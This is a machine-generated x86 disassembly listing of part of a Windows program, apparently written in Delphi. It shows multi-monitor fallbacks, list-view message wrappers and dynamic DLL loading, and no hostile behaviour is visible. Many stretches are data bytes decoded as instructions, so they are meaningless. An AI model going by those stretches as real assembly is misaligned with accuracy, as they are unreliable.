add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x9b
mov al [ 0x429a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 + 0x80042 ] ch
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
cld
fwait
inc edx
add [ eax + 0x29 ] cl
inc eax
add [ eax - 0x64 ] al
inc edx
add [ esp + ebx * 4 ] ch
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418818
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
inc edx
add [ eax ] cl
add [ eax ] al
add [ edx + ebx * 4 + 0x42 ] dl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
cld
fwait
inc edx
add [ eax - 0x64 ] ah
inc edx
add [ eax - 0x64 ] al
inc edx
add [ esp + ebx * 4 ] ch
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x800408d
fwait
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 ] dl
mov eax edi
call sub_403154
sub_429b1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_429b74
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418818
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403154
sub_429bb8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_429bfc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_429c40
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4184a0
mov eax esi
pop esi
pop ebx
retn
sub_429c6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429c91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c98
retn
sub_429cac
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_429d0c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_429cac
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_429e18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429ebc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406ab8
push eax
push esi
push 0x100c
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429ef0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_429f3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429f84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429fe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406ab8
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a004
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1021
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a078
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x102a
push ebx
call SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_42a098
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a0d8
push ebx
push esi
mov esi edx
mov ebx eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageA
shr eax 0xc
dec eax
pop esi
pop ebx
retn
sub_42a0f8
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageA
add esp 0x28
retn
sub_42a124
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a174
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a1b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a1d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a1f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1041
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a22c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a251
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a258
retn
sub_42a264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_42a323
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a32a
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a264
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f50
sub_42a34c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42a264
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42a3d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42a264
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42a464
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42a264
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42a3d4
sub_42a4fa
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42a264
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42a57b
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a264
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a668
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42a264
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a73c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42a264
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a810
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42a264
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42a9ab
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42a9d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a9d8
retn
sub_42a9ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aa11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa18
retn
sub_42aa24
sub [ edx + 0xd0f0042 ] ch
dec ecx
dec eax
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa18
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
stosd [ edi ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
lodsb [ esi ]
jo r-xdata
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xaa907265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call [ edx + ebp * 4 + 0x110f0042 ]
dec ecx
inc ebx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dh
lodsb [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x54 ] al
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
add ah cl
stosd [ edi ]
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsb
je r-xdata
js r-xdata
shr [ edx + 0x130f0042 ] 0x1
dec ecx
inc ebp
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
stosd [ edi ]
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42aa60c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x40042aa ] dl
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
jns r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax + esi * 2 + 0x33840040 ] ch
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b7b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
push esi
je r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xaacc7265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax * 2 + 0x706c6548 ] dl
push ebx
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42ab4cc0 ]
stosd [ edi ]
inc edx
add bh bh
dec [ ebx + ebp * 4 ]
push cs
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
stosb [ edi ]
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42aad0c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fa4
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] 0x3000408d
lodsb [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
lea eax [ eax ]
int3
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x5433ffc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7be
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049cc
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
inc ebx
xor edi edi
int3
mov eax eax
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429b58
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405800
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ade8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42ae5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42af74
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4057d4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae65
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42af00
mov [ rw-data ] eax
sub_42ae6c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42af00
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405800
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42aec4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4057d4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42af00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_429b1c
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429b1c
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429b1c
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f50
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42af74
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b075
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aec4
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_429b6c
mov edx [ esi + 0x8 ]
mov eax edi
